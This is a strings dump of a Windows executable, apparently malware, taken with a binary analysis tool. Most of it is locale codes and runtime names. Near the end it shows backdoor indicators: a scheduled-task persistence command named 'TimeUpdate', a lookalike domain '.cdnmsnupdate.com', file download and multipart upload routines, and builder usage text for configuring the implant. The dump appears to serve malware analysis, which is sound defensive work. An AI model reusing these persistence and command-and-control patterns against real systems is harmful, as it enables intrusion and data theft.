Metadata Signature: 0x648 0x10001424a5342 12
.NET Version: v2.0.50727
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 814
Stream name: #~ 4
DirectoryAddress: 880 Size: 7b4
Stream name: #Strings 12
DirectoryAddress: 1034 Size: 44
Stream name: #US 4
DirectoryAddress: 1078 Size: 10
Stream name: #GUID 8
DirectoryAddress: 1088 Size: 3d0
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x00000178 0x00000178 5   6            ascii   .text
2    0x0000019f 0x0000019f 6   7            ascii   `.rsrc
3    0x000001c7 0x000001c7 7   8            ascii   @.reloc
1364 0x0001f08c 0x10020e8c 5   12   .text   utf16le tt-RU
1365 0x0001f098 0x10020e98 5   12   .text   utf16le bn-IN
1366 0x0001f0a4 0x10020ea4 5   12   .text   utf16le pa-IN
1367 0x0001f0b0 0x10020eb0 5   12   .text   utf16le gu-IN
1368 0x0001f0bc 0x10020ebc 5   12   .text   utf16le ta-IN
1369 0x0001f0c8 0x10020ec8 5   12   .text   utf16le te-IN
1370 0x0001f0d4 0x10020ed4 5   12   .text   utf16le kn-IN
1371 0x0001f0e0 0x10020ee0 5   12   .text   utf16le ml-IN
1372 0x0001f0ec 0x10020eec 5   12   .text   utf16le mr-IN
1373 0x0001f0f8 0x10020ef8 5   12   .text   utf16le sa-IN
1374 0x0001f104 0x10020f04 5   12   .text   utf16le mn-MN
1375 0x0001f110 0x10020f10 5   12   .text   utf16le cy-GB
1376 0x0001f11c 0x10020f1c 5   12   .text   utf16le gl-ES
1377 0x0001f128 0x10020f28 6   14   .text   utf16le kok-IN
1378 0x0001f138 0x10020f38 6   14   .text   utf16le syr-SY
1379 0x0001f148 0x10020f48 6   14   .text   utf16le div-MV
1380 0x0001f158 0x10020f58 6   14   .text   utf16le quz-BO
1381 0x0001f168 0x10020f68 5   12   .text   utf16le ns-ZA
1382 0x0001f174 0x10020f74 5   12   .text   utf16le mi-NZ
1383 0x0001f180 0x10020f80 5   12   .text   utf16le ar-IQ
1384 0x0001f18c 0x10020f8c 5   12   .text   utf16le de-CH
1385 0x0001f198 0x10020f98 5   12   .text   utf16le en-GB
1386 0x0001f1a4 0x10020fa4 5   12   .text   utf16le es-MX
1387 0x0001f1b0 0x10020fb0 5   12   .text   utf16le fr-BE
1388 0x0001f1bc 0x10020fbc 5   12   .text   utf16le it-CH
1389 0x0001f1c8 0x10020fc8 5   12   .text   utf16le nl-BE
1390 0x0001f1d4 0x10020fd4 5   12   .text   utf16le nn-NO
1391 0x0001f1e0 0x10020fe0 5   12   .text   utf16le pt-PT
1392 0x0001f1ec 0x10020fec 10  22   .text   utf16le sr-SP-Latn
1393 0x0001f204 0x10021004 5   12   .text   utf16le sv-FI
1394 0x0001f210 0x10021010 10  22   .text   utf16le az-AZ-Cyrl
1395 0x0001f228 0x10021028 5   12   .text   utf16le se-SE
1396 0x0001f234 0x10021034 5   12   .text   utf16le ms-BN
1397 0x0001f240 0x10021040 10  22   .text   utf16le uz-UZ-Cyrl
1398 0x0001f258 0x10021058 6   14   .text   utf16le quz-EC
1399 0x0001f268 0x10021068 5   12   .text   utf16le ar-EG
1400 0x0001f274 0x10021074 5   12   .text   utf16le zh-HK
1401 0x0001f280 0x10021080 5   12   .text   utf16le de-AT
1402 0x0001f28c 0x1002108c 5   12   .text   utf16le en-AU
1403 0x0001f298 0x10021098 5   12   .text   utf16le es-ES
1404 0x0001f2a4 0x100210a4 5   12   .text   utf16le fr-CA
1405 0x0001f2b0 0x100210b0 10  22   .text   utf16le sr-SP-Cyrl
1406 0x0001f2c8 0x100210c8 5   12   .text   utf16le se-FI
1407 0x0001f2d4 0x100210d4 6   14   .text   utf16le quz-PE
1408 0x0001f2e4 0x100210e4 5   12   .text   utf16le ar-LY
1409 0x0001f2f0 0x100210f0 5   12   .text   utf16le zh-SG
1410 0x0001f2fc 0x100210fc 5   12   .text   utf16le de-LU
1411 0x0001f308 0x10021108 5   12   .text   utf16le en-CA
1412 0x0001f314 0x10021114 5   12   .text   utf16le es-GT
1413 0x0001f320 0x10021120 5   12   .text   utf16le fr-CH
1414 0x0001f32c 0x1002112c 5   12   .text   utf16le hr-BA
1415 0x0001f338 0x10021138 6   14   .text   utf16le smj-NO
1416 0x0001f348 0x10021148 5   12   .text   utf16le ar-DZ
1417 0x0001f354 0x10021154 5   12   .text   utf16le zh-MO
1418 0x0001f360 0x10021160 5   12   .text   utf16le de-LI
1419 0x0001f36c 0x1002116c 5   12   .text   utf16le en-NZ
1420 0x0001f378 0x10021178 5   12   .text   utf16le es-CR
1421 0x0001f384 0x10021184 5   12   .text   utf16le fr-LU
1422 0x0001f390 0x10021190 10  22   .text   utf16le bs-BA-Latn
1423 0x0001f3a8 0x100211a8 6   14   .text   utf16le smj-SE
1424 0x0001f3b8 0x100211b8 5   12   .text   utf16le ar-MA
1425 0x0001f3c4 0x100211c4 5   12   .text   utf16le en-IE
1426 0x0001f3d0 0x100211d0 5   12   .text   utf16le es-PA
1427 0x0001f3dc 0x100211dc 5   12   .text   utf16le fr-MC
1428 0x0001f3e8 0x100211e8 10  22   .text   utf16le sr-BA-Latn
1429 0x0001f400 0x10021200 6   14   .text   utf16le sma-NO
1430 0x0001f410 0x10021210 5   12   .text   utf16le ar-TN
1431 0x0001f41c 0x1002121c 5   12   .text   utf16le en-ZA
1432 0x0001f428 0x10021228 5   12   .text   utf16le es-DO
1433 0x0001f434 0x10021234 10  22   .text   utf16le sr-BA-Cyrl
1434 0x0001f44c 0x1002124c 6   14   .text   utf16le sma-SE
1435 0x0001f45c 0x1002125c 5   12   .text   utf16le ar-OM
1436 0x0001f468 0x10021268 5   12   .text   utf16le en-JM
1437 0x0001f474 0x10021274 5   12   .text   utf16le es-VE
1438 0x0001f480 0x10021280 6   14   .text   utf16le sms-FI
1439 0x0001f490 0x10021290 5   12   .text   utf16le ar-YE
1440 0x0001f49c 0x1002129c 5   12   .text   utf16le en-CB
1441 0x0001f4a8 0x100212a8 5   12   .text   utf16le es-CO
1442 0x0001f4b4 0x100212b4 6   14   .text   utf16le smn-FI
1443 0x0001f4c4 0x100212c4 5   12   .text   utf16le ar-SY
1444 0x0001f4d0 0x100212d0 5   12   .text   utf16le en-BZ
1445 0x0001f4dc 0x100212dc 5   12   .text   utf16le es-PE
1446 0x0001f4e8 0x100212e8 5   12   .text   utf16le ar-JO
1447 0x0001f4f4 0x100212f4 5   12   .text   utf16le en-TT
1448 0x0001f500 0x10021300 5   12   .text   utf16le es-AR
1449 0x0001f50c 0x1002130c 5   12   .text   utf16le ar-LB
1450 0x0001f518 0x10021318 5   12   .text   utf16le en-ZW
1451 0x0001f524 0x10021324 5   12   .text   utf16le es-EC
1452 0x0001f530 0x10021330 5   12   .text   utf16le ar-KW
1453 0x0001f53c 0x1002133c 5   12   .text   utf16le en-PH
1454 0x0001f548 0x10021348 5   12   .text   utf16le es-CL
1455 0x0001f554 0x10021354 5   12   .text   utf16le ar-AE
1456 0x0001f560 0x10021360 5   12   .text   utf16le es-UY
1457 0x0001f56c 0x1002136c 5   12   .text   utf16le ar-BH
1458 0x0001f578 0x10021378 5   12   .text   utf16le es-PY
1459 0x0001f584 0x10021384 5   12   .text   utf16le ar-QA
1460 0x0001f590 0x10021390 5   12   .text   utf16le es-BO
1461 0x0001f59c 0x1002139c 5   12   .text   utf16le es-SV
1462 0x0001f5a8 0x100213a8 5   12   .text   utf16le es-HN
1463 0x0001f5b4 0x100213b4 5   12   .text   utf16le es-NI
1464 0x0001f5c0 0x100213c0 5   12   .text   utf16le es-PR
1465 0x0001f5cc 0x100213cc 6   14   .text   utf16le zh-CHT
1466 0x0001fd14 0x10021b14 5   12   .text   utf16le ar-ae
1467 0x0001fd20 0x10021b20 5   12   .text   utf16le ar-bh
1468 0x0001fd2c 0x10021b2c 5   12   .text   utf16le ar-dz
1469 0x0001fd38 0x10021b38 5   12   .text   utf16le ar-eg
1470 0x0001fd44 0x10021b44 5   12   .text   utf16le ar-iq
1471 0x0001fd50 0x10021b50 5   12   .text   utf16le ar-jo
1472 0x0001fd5c 0x10021b5c 5   12   .text   utf16le ar-kw
1473 0x0001fd68 0x10021b68 5   12   .text   utf16le ar-lb
1474 0x0001fd74 0x10021b74 5   12   .text   utf16le ar-ly
1475 0x0001fd80 0x10021b80 5   12   .text   utf16le ar-ma
1476 0x0001fd8c 0x10021b8c 5   12   .text   utf16le ar-om
1477 0x0001fd98 0x10021b98 5   12   .text   utf16le ar-qa
1478 0x0001fda4 0x10021ba4 5   12   .text   utf16le ar-sa
1479 0x0001fdb0 0x10021bb0 5   12   .text   utf16le ar-sy
1480 0x0001fdbc 0x10021bbc 5   12   .text   utf16le ar-tn
1481 0x0001fdc8 0x10021bc8 5   12   .text   utf16le ar-ye
1482 0x0001fdd4 0x10021bd4 10  22   .text   utf16le az-az-cyrl
1483 0x0001fdec 0x10021bec 10  22   .text   utf16le az-az-latn
1484 0x0001fe04 0x10021c04 5   12   .text   utf16le be-by
1485 0x0001fe10 0x10021c10 5   12   .text   utf16le bg-bg
1486 0x0001fe1c 0x10021c1c 5   12   .text   utf16le bn-in
1487 0x0001fe28 0x10021c28 10  22   .text   utf16le bs-ba-latn
1488 0x0001fe40 0x10021c40 5   12   .text   utf16le ca-es
1489 0x0001fe4c 0x10021c4c 5   12   .text   utf16le cs-cz
1490 0x0001fe58 0x10021c58 5   12   .text   utf16le cy-gb
1491 0x0001fe64 0x10021c64 5   12   .text   utf16le da-dk
1492 0x0001fe70 0x10021c70 5   12   .text   utf16le de-at
1493 0x0001fe7c 0x10021c7c 5   12   .text   utf16le de-ch
1494 0x0001fe88 0x10021c88 5   12   .text   utf16le de-de
1495 0x0001fe94 0x10021c94 5   12   .text   utf16le de-li
1496 0x0001fea0 0x10021ca0 5   12   .text   utf16le de-lu
1497 0x0001feac 0x10021cac 6   14   .text   utf16le div-mv
1498 0x0001febc 0x10021cbc 5   12   .text   utf16le el-gr
1499 0x0001fec8 0x10021cc8 5   12   .text   utf16le en-au
1500 0x0001fed4 0x10021cd4 5   12   .text   utf16le en-bz
1501 0x0001fee0 0x10021ce0 5   12   .text   utf16le en-ca
1502 0x0001feec 0x10021cec 5   12   .text   utf16le en-cb
1503 0x0001fef8 0x10021cf8 5   12   .text   utf16le en-gb
1504 0x0001ff04 0x10021d04 5   12   .text   utf16le en-ie
1505 0x0001ff10 0x10021d10 5   12   .text   utf16le en-jm
1506 0x0001ff1c 0x10021d1c 5   12   .text   utf16le en-nz
1507 0x0001ff28 0x10021d28 5   12   .text   utf16le en-ph
1508 0x0001ff34 0x10021d34 5   12   .text   utf16le en-tt
1509 0x0001ff40 0x10021d40 5   12   .text   utf16le en-us
1510 0x0001ff4c 0x10021d4c 5   12   .text   utf16le en-za
1511 0x0001ff58 0x10021d58 5   12   .text   utf16le en-zw
1512 0x0001ff64 0x10021d64 5   12   .text   utf16le es-ar
1513 0x0001ff70 0x10021d70 5   12   .text   utf16le es-bo
1514 0x0001ff7c 0x10021d7c 5   12   .text   utf16le es-cl
1515 0x0001ff88 0x10021d88 5   12   .text   utf16le es-co
1516 0x0001ff94 0x10021d94 5   12   .text   utf16le es-cr
1517 0x0001ffa0 0x10021da0 5   12   .text   utf16le es-do
1518 0x0001ffac 0x10021dac 5   12   .text   utf16le es-ec
1519 0x0001ffb8 0x10021db8 5   12   .text   utf16le es-es
1520 0x0001ffc4 0x10021dc4 5   12   .text   utf16le es-gt
1521 0x0001ffd0 0x10021dd0 5   12   .text   utf16le es-hn
1522 0x0001ffdc 0x10021ddc 5   12   .text   utf16le es-mx
1523 0x0001ffe8 0x10021de8 5   12   .text   utf16le es-ni
1524 0x0001fff4 0x10021df4 5   12   .text   utf16le es-pa
1525 0x00020000 0x10021e00 5   12   .text   utf16le es-pe
1526 0x0002000c 0x10021e0c 5   12   .text   utf16le es-pr
1527 0x00020018 0x10021e18 5   12   .text   utf16le es-py
1528 0x00020024 0x10021e24 5   12   .text   utf16le es-sv
1529 0x00020030 0x10021e30 5   12   .text   utf16le es-uy
1530 0x0002003c 0x10021e3c 5   12   .text   utf16le es-ve
1531 0x00020048 0x10021e48 5   12   .text   utf16le et-ee
1532 0x00020054 0x10021e54 5   12   .text   utf16le eu-es
1533 0x00020060 0x10021e60 5   12   .text   utf16le fa-ir
1534 0x0002006c 0x10021e6c 5   12   .text   utf16le fi-fi
1535 0x00020078 0x10021e78 5   12   .text   utf16le fo-fo
1536 0x00020084 0x10021e84 5   12   .text   utf16le fr-be
1537 0x00020090 0x10021e90 5   12   .text   utf16le fr-ca
1538 0x0002009c 0x10021e9c 5   12   .text   utf16le fr-ch
1539 0x000200a8 0x10021ea8 5   12   .text   utf16le fr-fr
1540 0x000200b4 0x10021eb4 5   12   .text   utf16le fr-lu
1541 0x000200c0 0x10021ec0 5   12   .text   utf16le fr-mc
1542 0x000200cc 0x10021ecc 5   12   .text   utf16le gl-es
1543 0x000200d8 0x10021ed8 5   12   .text   utf16le gu-in
1544 0x000200e4 0x10021ee4 5   12   .text   utf16le he-il
1545 0x000200f0 0x10021ef0 5   12   .text   utf16le hi-in
1546 0x000200fc 0x10021efc 5   12   .text   utf16le hr-ba
1547 0x00020108 0x10021f08 5   12   .text   utf16le hr-hr
1548 0x00020114 0x10021f14 5   12   .text   utf16le hu-hu
1549 0x00020120 0x10021f20 5   12   .text   utf16le hy-am
1550 0x0002012c 0x10021f2c 5   12   .text   utf16le id-id
1551 0x00020138 0x10021f38 5   12   .text   utf16le is-is
1552 0x00020144 0x10021f44 5   12   .text   utf16le it-ch
1553 0x00020150 0x10021f50 5   12   .text   utf16le it-it
1554 0x0002015c 0x10021f5c 5   12   .text   utf16le ja-jp
1555 0x00020168 0x10021f68 5   12   .text   utf16le ka-ge
1556 0x00020174 0x10021f74 5   12   .text   utf16le kk-kz
1557 0x00020180 0x10021f80 5   12   .text   utf16le kn-in
1558 0x0002018c 0x10021f8c 6   14   .text   utf16le kok-in
1559 0x0002019c 0x10021f9c 5   12   .text   utf16le ko-kr
1560 0x000201a8 0x10021fa8 5   12   .text   utf16le ky-kg
1561 0x000201b4 0x10021fb4 5   12   .text   utf16le lt-lt
1562 0x000201c0 0x10021fc0 5   12   .text   utf16le lv-lv
1563 0x000201cc 0x10021fcc 5   12   .text   utf16le mi-nz
1564 0x000201d8 0x10021fd8 5   12   .text   utf16le mk-mk
1565 0x000201e4 0x10021fe4 5   12   .text   utf16le ml-in
1566 0x000201f0 0x10021ff0 5   12   .text   utf16le mn-mn
1567 0x000201fc 0x10021ffc 5   12   .text   utf16le mr-in
1568 0x00020208 0x10022008 5   12   .text   utf16le ms-bn
1569 0x00020214 0x10022014 5   12   .text   utf16le ms-my
1570 0x00020220 0x10022020 5   12   .text   utf16le mt-mt
1571 0x0002022c 0x1002202c 5   12   .text   utf16le nb-no
1572 0x00020238 0x10022038 5   12   .text   utf16le nl-be
1573 0x00020244 0x10022044 5   12   .text   utf16le nl-nl
1574 0x00020250 0x10022050 5   12   .text   utf16le nn-no
1575 0x0002025c 0x1002205c 5   12   .text   utf16le ns-za
1576 0x00020268 0x10022068 5   12   .text   utf16le pa-in
1577 0x00020274 0x10022074 5   12   .text   utf16le pl-pl
1578 0x00020280 0x10022080 5   12   .text   utf16le pt-br
1579 0x0002028c 0x1002208c 5   12   .text   utf16le pt-pt
1580 0x00020298 0x10022098 6   14   .text   utf16le quz-bo
1581 0x000202a8 0x100220a8 6   14   .text   utf16le quz-ec
1582 0x000202b8 0x100220b8 6   14   .text   utf16le quz-pe
1583 0x000202c8 0x100220c8 5   12   .text   utf16le ro-ro
1584 0x000202d4 0x100220d4 5   12   .text   utf16le ru-ru
1585 0x000202e0 0x100220e0 5   12   .text   utf16le sa-in
1586 0x000202ec 0x100220ec 5   12   .text   utf16le se-fi
1587 0x000202f8 0x100220f8 5   12   .text   utf16le se-no
1588 0x00020304 0x10022104 5   12   .text   utf16le se-se
1589 0x00020310 0x10022110 5   12   .text   utf16le sk-sk
1590 0x0002031c 0x1002211c 5   12   .text   utf16le sl-si
1591 0x00020328 0x10022128 6   14   .text   utf16le sma-no
1592 0x00020338 0x10022138 6   14   .text   utf16le sma-se
1593 0x00020348 0x10022148 6   14   .text   utf16le smj-no
1594 0x00020358 0x10022158 6   14   .text   utf16le smj-se
1595 0x00020368 0x10022168 6   14   .text   utf16le smn-fi
1596 0x00020378 0x10022178 6   14   .text   utf16le sms-fi
1597 0x00020388 0x10022188 5   12   .text   utf16le sq-al
1598 0x00020394 0x10022194 10  22   .text   utf16le sr-ba-cyrl
1599 0x000203ac 0x100221ac 10  22   .text   utf16le sr-ba-latn
1600 0x000203c4 0x100221c4 10  22   .text   utf16le sr-sp-cyrl
1601 0x000203dc 0x100221dc 10  22   .text   utf16le sr-sp-latn
1602 0x000203f4 0x100221f4 5   12   .text   utf16le sv-fi
1603 0x00020400 0x10022200 5   12   .text   utf16le sv-se
1604 0x0002040c 0x1002220c 5   12   .text   utf16le sw-ke
1605 0x00020418 0x10022218 6   14   .text   utf16le syr-sy
1606 0x00020428 0x10022228 5   12   .text   utf16le ta-in
1607 0x00020434 0x10022234 5   12   .text   utf16le te-in
1608 0x00020440 0x10022240 5   12   .text   utf16le th-th
1609 0x0002044c 0x1002224c 5   12   .text   utf16le tn-za
1610 0x00020458 0x10022258 5   12   .text   utf16le tr-tr
1611 0x00020464 0x10022264 5   12   .text   utf16le tt-ru
1612 0x00020470 0x10022270 5   12   .text   utf16le uk-ua
1613 0x0002047c 0x1002227c 5   12   .text   utf16le ur-pk
1614 0x00020488 0x10022288 10  22   .text   utf16le uz-uz-cyrl
1615 0x000204a0 0x100222a0 10  22   .text   utf16le uz-uz-latn
1616 0x000204b8 0x100222b8 5   12   .text   utf16le vi-vn
1617 0x000204c4 0x100222c4 5   12   .text   utf16le xh-za
1618 0x000204d0 0x100222d0 6   14   .text   utf16le zh-chs
1619 0x000204e0 0x100222e0 6   14   .text   utf16le zh-cht
1620 0x000204f0 0x100222f0 5   12   .text   utf16le zh-cn
1621 0x000204fc 0x100222fc 5   12   .text   utf16le zh-hk
1622 0x00020508 0x10022308 5   12   .text   utf16le zh-mo
1623 0x00020514 0x10022314 5   12   .text   utf16le zh-sg
1624 0x00020520 0x10022320 5   12   .text   utf16le zh-tw
1625 0x0002052c 0x1002232c 5   12   .text   utf16le zu-za
1626 0x00020550 0x10022350 7   16   .text   utf16le CONOUT$
1627 0x00020568 0x10022368 5   6    .text   ascii   log10
1628 0x000206bc 0x100224bc 4   5    .text   ascii   lzZ?
1629 0x000207b0 0x100225b0 5   6    .text   ascii   log10
1630 0x000207c0 0x100225c0 4   5    .text   ascii   asin
1631 0x000207c8 0x100225c8 4   5    .text   ascii   acos
1632 0x000207d0 0x100225d0 4   5    .text   ascii   sqrt
1633 0x00020814 0x10022614 4   5    .text   ascii   \tk8=
1634 0x00020843 0x10022643 5   6    .text   ascii   \tQ*\e=
1635 0x00020854 0x10022654 4   5    .text   ascii   b6\b=
1636 0x000208eb 0x100226eb 4   6    .text   utf8    N\vָ? blocks=Basic Latin,Hebrew
1637 0x000208ff 0x100226ff 6   7    .text   ascii   ?5Wg4p
1638 0x00020911 0x10022711 4   5    .text   ascii   Nv$^
1639 0x00020949 0x10022749 4   6    .text   utf8     <śm blocks=Basic Latin,Latin Extended-A
1640 0x00020981 0x10022781 4   5    .text   ascii   w(@\t
1641 0x000209c3 0x100227c3 5   6    .text   ascii   BC .=
1642 0x000209e1 0x100227e1 4   5    .text   ascii   a>-\e
1643 0x000209fa 0x100227fa 4   5    .text   ascii   (lX 
1644 0x00020ac4 0x100228c4 4   5    .text   ascii   #{ =
1645 0x00020ac9 0x100228c9 4   5    .text   ascii   `~R=
1646 0x00020b04 0x10022904 4   5    .text   ascii   }s"=
1647 0x00020b0a 0x1002290a 4   5    .text   ascii   \tE[\n
1648 0x00020b11 0x10022911 5   6    .text   ascii   %S#[k
1649 0x00020b59 0x10022959 4   6    .text   utf8    x¾/@ blocks=Basic Latin,Latin-1 Supplement
1650 0x00020b62 0x10022962 6   7    .text   ascii   "B <1=
1651 0x00020b71 0x10022971 4   5    .text   ascii   \-!y
1652 0x00020b92 0x10022992 6   7    .text   ascii   \f#.X'=
1653 0x00020bc4 0x100229c4 4   5    .text   ascii   i9+=
1654 0x0002100f 0x10022e0f 5   6    .text   ascii   ?tanh
1655 0x00021018 0x10022e18 4   5    .text   ascii   atan
1656 0x00021020 0x10022e20 5   6    .text   ascii   atan2
1657 0x00021034 0x10022e34 4   5    .text   ascii   ceil
1658 0x0002103c 0x10022e3c 5   6    .text   ascii   floor
1659 0x00021044 0x10022e44 4   5    .text   ascii   fabs
1660 0x0002104c 0x10022e4c 4   5    .text   ascii   modf
1661 0x00021054 0x10022e54 5   6    .text   ascii   ldexp
1662 0x0002105c 0x10022e5c 5   6    .text   ascii   _cabs
1663 0x00021064 0x10022e64 6   7    .text   ascii   _hypot
1664 0x0002106c 0x10022e6c 4   5    .text   ascii   fmod
1665 0x00021074 0x10022e74 5   6    .text   ascii   frexp
1666 0x00021088 0x10022e88 5   6    .text   ascii   _logb
1667 0x00021090 0x10022e90 10  11   .text   ascii   _nextafter
1668 0x00021188 0x10022f88 4   5    .text   ascii   sinh
1669 0x00021190 0x10022f90 4   5    .text   ascii   cosh
1670 0x000211b0 0x10022fb0 4   5    .text   ascii   %02x
1671 0x000211b8 0x10022fb8 6   7    .text   ascii   n.n.c.
1672 0x000211c0 0x10022fc0 63  64   .text   ascii   %08lX%04hX%04hX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX
1673 0x00021214 0x10023014 4   5    .text   ascii   www.
1674 0x00021220 0x10023020 11  12   .text   ascii   Wininet.dll
1675 0x0002122c 0x1002302c 13  14   .text   ascii   InternetOpenA
1676 0x0002123c 0x1002303c 7   8    .text   ascii   Firefox
1677 0x00021244 0x10023044 16  17   .text   ascii   InternetConnectA
1678 0x00021258 0x10023058 16  17   .text   ascii   HttpOpenRequestA
1679 0x0002126c 0x1002306c 8   9    .text   ascii   HTTP/1.0
1680 0x00021278 0x10023078 4   5    .text   ascii   POST
1681 0x00021284 0x10023084 22  23   .text   ascii   HttpAddRequestHeadersA
1682 0x0002129c 0x1002309c 16  17   .text   ascii   HttpSendRequestA
1683 0x000212b0 0x100230b0 16  17   .text   ascii   InternetReadFile
1684 0x000212c4 0x100230c4 10  11   .text   ascii   Urlmon.dll
1685 0x000212d0 0x100230d0 111 112  .text   ascii   cmd /c schtasks /query /tn TimeUpdate > NUL 2>&1 || schtasks /create /sc minute /mo %%%% /tn TimeUpdate /tr "\"
1686 0x00021340 0x10023140 4   5    .text   ascii   %%%%
1687 0x0002134c 0x1002314c 17  18   .text   ascii   .cdnmsnupdate.com
1688 0x0002135e 0x1002315e 38  39   .text   ascii   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1689 0x00021388 0x10023188 4   5    .text   ascii   Help
1690 0x00021390 0x10023190 48  49   .text   ascii   usage:\n-c  SampleDomain.com -m scheduleminutes\n\n
1691 0x000213cc 0x100231cc 7   8    .text   ascii   out.exe
1692 0x000213d4 0x100231d4 7   8    .text   ascii   Warning
1693 0x000213dc 0x100231dc 35  36   .text   ascii   !!! can not create output file !!!\n
1694 0x00021408 0x10023208 4   5    .text   ascii   %04d
1695 0x00021410 0x10023210 7   8    .text   ascii   Success
1696 0x00021418 0x10023218 24  25   .text   ascii   Configured successfully\n
1697 0x00021434 0x10023234 22  23   .text   ascii   Can not be configured\n
1698 0x00021450 0x10023250 7   8    .text   ascii   http://
1699 0x00021458 0x10023258 27  28   .text   ascii   can not specify comp name!!
1700 0x00021474 0x10023274 26  27   .text   ascii   can not specify username!!
1701 0x00021494 0x10023294 8   9    .text   ascii   action2/
1702 0x000214a0 0x100232a0 4   5    .text   ascii   temp
1703 0x000214a8 0x100232a8 18  19   .text   ascii   URLDownloadToFileA
1704 0x000214bc 0x100232bc 32  33   .text   ascii   C:\windows\system32\cmd.exe /c (
1705 0x000214e0 0x100232e0 7   8    .text   ascii   upload/
1706 0x000214e8 0x100232e8 6   7    .text   ascii   Host: 
1707 0x000214f0 0x100232f0 58  59   .text   ascii   \r\nContent-Type: multipart/form-data; boundary=myboundary\r\n
1708 0x00021530 0x10023330 131 132  .text   ascii   --myboundary\r\nContent-Type: application/octet-stream;charset=UTF-8\r\nContent-Disposition: form-data; name="file"; filename="a.a"\r\n\r\n
1709 0x000215b4 0x100233b4 18  19   .text   ascii   \r\n--myboundary--\r\n
1710 0x000215c8 0x100233c8 8   9    .text   ascii   \runlog*
1711 0x000215d4 0x100233d4 7   8    .text   ascii   \runlog
1712 0x000215dc 0x100233dc 5   6    .text   ascii   .tmp"
1713 0x000215e4 0x100233e4 5   6    .text   ascii   ) > "
1714 0x000215ec 0x100233ec 9   10   .text   ascii   response/
1715 0x000215f8 0x100233f8 29  30   .text   ascii   File Downloaded successfully\n
1716 0x00021628 0x10023428 64  65   .text   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
1717 0x00021878 0x10023678 4   5    .text   ascii   ETW0
1718 0x00021898 0x10023698 16  17   .text   ascii   InvokeMainViaCRT
1719 0x000218a9 0x100236a9 15  16   .text   ascii   "Main Invoked."
1720 0x000218ba 0x100236ba 8   9    .text   ascii   FileName
1721 0x000218d4 0x100236d4 14  15   .text   ascii   ExitMainViaCRT
1722 0x000218e3 0x100236e3 16  17   .text   ascii   "Main Returned."
1723 0x000218f5 0x100236f5 8   9    .text   ascii   FileName
1724 0x00021902 0x10023702 21  22   .text   ascii   Microsoft.CRTProvider
1725 0x0002191c 0x1002371c 4   6    .text   utf8    sPOω blocks=Basic Latin,Greek and Coptic
1726 0x0002192c 0x1002372c 4   5    .text   ascii   RSDS
1727 0x00021944 0x10023744 91  92   .text   ascii   C:\Users\test\Documents\Visual Studio 2015\Projects\Win32Project1\Release\Win32Project1.pdb
1728 0x000219b4 0x100237b4 4   5    .text   ascii   GCTL
1729 0x000219c0 0x100237c0 5   6    .text   ascii   .text
1730 0x000219d0 0x100237d0 8   9    .text   ascii   .text$mn
1731 0x000219e4 0x100237e4 8   9    .text   ascii   .idata$5
1732 0x000219f8 0x100237f8 6   7    .text   ascii   .00cfg
1733 0x00021a08 0x10023808 8   9    .text   ascii   .CRT$XCA
1734 0x00021a1c 0x1002381c 9   10   .text   ascii   .CRT$XCAA
1735 0x00021a30 0x10023830 8   9    .text   ascii   .CRT$XCZ
1736 0x00021a44 0x10023844 8   9    .text   ascii   .CRT$XIA
1737 0x00021a58 0x10023858 9   10   .text   ascii   .CRT$XIAA
1738 0x00021a6c 0x1002386c 9   10   .text   ascii   .CRT$XIAC
1739 0x00021a80 0x10023880 8   9    .text   ascii   .CRT$XIC
1740 0x00021a94 0x10023894 8   9    .text   ascii   .CRT$XIZ
1741 0x00021aa8 0x100238a8 8   9    .text   ascii   .CRT$XPA
1742 0x00021abc 0x100238bc 8   9    .text   ascii   .CRT$XPX
1743 0x00021ad0 0x100238d0 9   10   .text   ascii   .CRT$XPXA
1744 0x00021ae4 0x100238e4 8   9    .text   ascii   .CRT$XPZ
1745 0x00021af8 0x100238f8 8   9    .text   ascii   .CRT$XTA
1746 0x00021b0c 0x1002390c 8   9    .text   ascii   .CRT$XTZ
1747 0x00021b20 0x10023920 6   7    .text   ascii   .rdata
1748 0x00021b30 0x10023930 8   9    .text   ascii   .rdata$r
1749 0x00021b44 0x10023944 13  14   .text   ascii   .rdata$sxdata
